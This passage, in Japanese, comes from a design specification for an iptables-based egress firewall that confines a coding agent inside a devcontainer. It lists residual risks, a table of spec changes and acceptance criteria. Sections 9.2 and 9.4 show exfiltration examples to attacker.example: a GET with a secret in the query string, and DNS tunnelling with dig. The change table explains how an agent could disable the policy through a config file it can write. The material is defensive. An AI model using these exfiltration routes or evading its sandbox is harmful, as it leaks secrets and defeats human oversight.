web search のために GET だけ全ドメインに開けたい、という要求は次の 2 つの理由で満たせません。

1. **GET は書き出しチャネル。** `GET https://attacker.example/?data=<秘密>` で任意の宛先に情報を出せます。§1 の目的 1 が丸ごと無効になります
2. **L3/L4 では実装できない。** メソッドは L7 の概念で、iptables に見えるのは TCP/443 への接続だけです。L4 で表現すると 443 番の全開放になり、POST も通ります

**そもそも要求の大半が成立しません。** Claude Code の WebSearch / WebFetch は Anthropic 側で処理が完結し、コンテナから任意ドメインへの egress を必要としません（通信先は `api.anthropic.com` のみ）。egress 規制下でもそのまま使えます。詳細と実測手順は [`web-search-fetch.md`](./web-search-fetch.md) を参照してください。

コンテナから直接取得する必要がある場合は、そのドメインを `allowDomains` に個別追加します。本命は L7 proxy（§10）です。

### 9.3 適用前に確立された接続

最終テーブルは `ESTABLISHED,RELATED` を ACCEPT するため、適用前に確立されていた allowlist 外への TCP 接続は継続できます。DNS だけは例外で、53 番宛の DROP を汎用 ESTABLISHED より前に置いているため遮断されます。panic テーブルには OUTPUT の ESTABLISHED 許可がありません。

`postStartCommand` はコンテナ起動直後、agent が動き出す前に実行されるため、実運用での影響は限定的です。

### 9.4 DNS トンネリングは防げない

53 番の宛先はリゾルバ 1 つに固定していますが、**そのリゾルバは再帰問い合わせをします。** `dig <秘密をエンコードした名前>.attacker.example` は正規のリゾルバ経由で攻撃者の権威ネームサーバーに到達します。TXT レスポンスで戻りチャネルも作れます。

**埋め込みリゾルバ `127.0.0.11` でも同じです。** Docker デーモンがホスト側の netns から上流へ転送するため、コンテナの OUTPUT チェーンは上流パケットを見ません。リゾルバの選択では解決しません。

得られている性質は「経路の固定と、それ以外の試行の遮断・記録」であり、トンネリングの遮断ではありません。**受容済み残余リスク**として扱います（§1 の Non-goals、[known-issues](./known-issues.md) 項目 13）。解消は §10 の L7 proxy 移行時、または DNS 層のフィルタ導入時です。

---

## 10. 将来拡張

* **L7 proxy 移行** — ホスト側に proxy を置く段階になったら、本スクリプトは「proxy 宛 + DNS 固定のみ許可」に縮小し、ドメイン/メソッド ACL は proxy 側 per-project 設定へ移す。`firewall.json` のスキーマは proxy 設定へ変換可能な形（ドメインリスト中心）を維持する。§9.1 と §9.2 はここで解消する
* **IPv6 allowlist** — 必要になった場合、`hash:net family inet6` の set 追加、AAAA 解決、`emit_filter_v6` への ACCEPT 1 行、GitHub meta の v6 レンジ取得で対応できる構造になっている
* **NFLOG** — 時刻・ポートまで必要になった場合、`LOG` を `NFLOG` に置き換えるとコンテナ内から `tcpdump -i nflog:1` で読めます（`nfnetlink_log` は netns 対応）。現状は ipset 記録で足りているため見送り
* **Claude Code sandbox 併用** — 現状 devcontainer 内 sandbox は namespace 制約で非推奨。devcontainer を外す判断をした場合は本スクリプト自体が不要になり、`.claude/settings.json` に役割が移る

---

## 11. 初版仕様からの変更点

[`initial-spec.md`](./initial-spec.md) からの差分です。実装とレビュー、実機検証を経て変わりました。

| 項目 | 初版 | 現在 | 理由 |
|---|---|---|---|
| DNS リゾルバ | `127.0.0.11` 決め打ち | `resolv.conf` から検出 | 埋め込みリゾルバはユーザー定義ネットワーク上でのみ提供される。デフォルトブリッジでは存在せず、決め打ちでは起動しない |
| 処理順序 | flush → 名前解決 → ルール適用 | **閉じる → 名前解決 → 適用** | 初版の順序では、初回に一時的な全開放窓が生じ、2 回目の実行は自分のポリシーで名前解決を遮断されて収束しない |
| ルール適用 | `iptables -A` の逐次投入 | `iptables-restore` の単一トランザクション | policy とルールが同時に切り替わる。中間状態と SIGKILL 耐性の問題が消える |
| nat テーブル | flush して Docker DNS を退避・復元 | **触らない** | 非特権ユーザーは書き込めない。退避・復元は不要な複雑性 |
| allowlist の更新 | set を毎回 destroy → create | staging set に構築 → `ipset swap` | 部分的に構築された set をルールが参照しない |
| DNS ルールの位置 | ESTABLISHED の後 | **ESTABLISHED より前** | 適用前に確立された外部 DNS フローが生き残る |
| sudoers | `... init-project-firewall.sh` | `... init-project-firewall.sh ""` | 引数を書かない Cmnd は任意の引数を許す |
| immutable | 「可能なら `chattr +i`」 | **要件から外す** | `CAP_LINUX_IMMUTABLE` が Docker の既定 capability に無く、ビルド時でも失敗する。防御価値も限定的 |
| 遮断先の記録 | `dmesg` の `LOG` を読む | **ipset `egress-audit-v4`**（`LOG` は補助）| `nf_log_all_netns` が既定 0 のため、コンテナからの `LOG` はホストでも読めない |
| IPv6 制御不能時 | 記述なし | スタック生存なら **exit≠0** | 「ip6tables が無い = IPv6 が無い」は成り立たない |
| 自己検証のプローブ | `example.com` 固定 | **動的に選択** | 正しい設定（`example.com` を許可）で自己検証が壊れる |
| 禁止 CIDR | RFC1918 | RFC1918 + CGNAT + loopback + link-local + multicast/予約、**レンジ重複判定** | Tailscale は CGNAT 帯を使う。前方一致では包含スーパーネットを見逃す |
| `sshdPort` | 記述なし（§4.7 で言及のみ）| スキーマに追加 | 初版が「firewall.json で上書き可」としていたため |
| 開発用オプション | 記述なし | `--check-config` / `--config` / `--resolv-conf`（sudo 下では拒否）| テスト容易性。sudoers が引数を許さないため本番経路には影響しない |
| 実効設定の所在 | repo の `.devcontainer/firewall.json` を探索 | **`/etc/egress-guard/firewall.json` のみ**（root 所有を検証） | エージェントは再適用を実行できる。エージェントが書けるファイルを適用経路に置くと、root を取らずに 2 手でポリシーが無効になる（§2.1） |
| 探索 | `/workspace` 配下を探索（glob 含む） | **探索なし**（`--config` で明示） | マウント先は環境依存で前提にできない。加えて、見に行く場所を増やすほどエージェントがポリシーを置ける候補地が増える |
| ワイルドカード | `*.example.com` を受理（例示も `*.neon.tech`） | **拒否**（回避策を含むメッセージ付き） | 受理して apex だけ解決するのは「受理するが実現しない」状態。設定者がサブドメインの許可を誤認する |
| ホスト宛の許可 | デフォルトゲートウェイのみ | ゲートウェイ + `host.docker.internal` | Docker Desktop では両者が別アドレスになり、ホスト上の DB に届かない |
| DNS 遮断の可視性 | 記述なし | DNS DROP の直前にも記録ルール | DNS の DROP は allowlist より前段。トンネリング試行がどこにも残らない |
| 自己検証のドメイン判定 | 記述なし（最初の 1 IP）| 再解決した IP の**いずれか**が set にあれば成功 | CDN のラウンドロビンで、正しいポリシーがランダムに起動失敗する |
| GitHub meta の取り込み | 記述なし | `aggregate` に渡す前に IPv4 のみへ絞る | meta API は IPv6 プレフィックスも返す。`aggregate` の挙動はビルド依存 |
| DNS 応答のアドレス | 検査なし | **禁止レンジを除外**（§4.5） | `allowCidrs` の検査を DNS 経由で迂回できた。メタデータサービスや RFC1918 が allowlist に載る |
| 設定エラー時の挙動 | ルール未適用のまま exit≠0 | **panic テーブル + exit≠0**（§4.6） | 初回起動時の「直前のポリシー」は全 ACCEPT。何も適用せず終了すると開いたまま残る |
| `host.docker.internal` の応答 | 検査なし | 私設アドレスであることを確認（§4.8） | 公開アドレスが返るのは名前の横取り。任意ホストへの穴になる |

---

## 12. 受け入れ基準

実装レビューおよび実機検証のチェックリストです。実機での手順は [`verification-checklist.md`](./verification-checklist.md)。

- [ ] 2 回連続実行で同一結果・exit 0（冪等）
- [ ] 3 回以上繰り返しても壊れない
- [ ] `timeout -s KILL` をどの段階で当てても、未許可先に到達できる状態にならない
- [ ] 中断後の再実行で収束する
- [ ] 不正な `firewall.json`（`"*"`、`*.com`、`*.example.com`、`0.0.0.0/0`、RFC1918、CGNAT、未知 version、未知フィールド、不正 JSON）が全て拒否される
- [ ] ワイルドカードの拒否メッセージが「代わりに何を書けばよいか」を含む
- [ ] バリデーション失敗時にルールが変更されていない
- [ ] §5 の自己検証が全て通る
- [ ] `dig @<外部DNS>` が UDP / TCP とも失敗する
- [ ] DNS の DROP ルールが汎用 ESTABLISHED ACCEPT より前にある
- [ ] ip6tables default DROP が入っている
- [ ] sudoers が固定パス・引数なし（末尾 `""`）で、対象が root 所有・`755`・非特権ユーザーから書き換え不可
- [ ] 非 root 所有のスクリプトを sudo 経由で実行すると exit≠0 する
- [ ] 引数付きの sudo 実行が拒否され、引数なしは通る
- [ ] ワークスペース側の `firewall.json` を書き換えて再適用しても、ポリシーが変化しない
- [ ] `/etc/egress-guard/firewall.json` が非 root 所有・または書き込み可の場合に exit≠0 する
- [ ] `allowHostPorts` がゲートウェイと `host.docker.internal` の両方に対して開く
- [ ] 外部ネームサーバーへの試行が `egress-audit-v4` に記録される
- [ ] 許可ドメインが禁止レンジのアドレスを返した場合、そのアドレスが allowlist に入らない
- [ ] 設定エラーで panic テーブルが適用される（ルール未適用で終わらない）
- [ ] `host.docker.internal` が公開アドレスを返した場合、そこにポートを開かない
- [ ] 個別ドメイン解決失敗で起動が止まらない
- [ ] audit mode で DROP されず、遮断先が記録される
- [ ] audit mode でも DNS 固定・IPv6・INPUT は締まっている
- [ ] 遮断先が `egress-audit-v4` に記録され、allowlist ACCEPT の直後・REJECT の前にルールがある
- [ ] `SET` ターゲットが使えない環境でフォールバックする
- [ ] 実利用（`git fetch` / `pnpm install` / npm registry / GitHub API）が成立する
- [ ] shellcheck クリーン
- [ ] ユニットテストが全て通る（設定バリデーション・ルール適用）
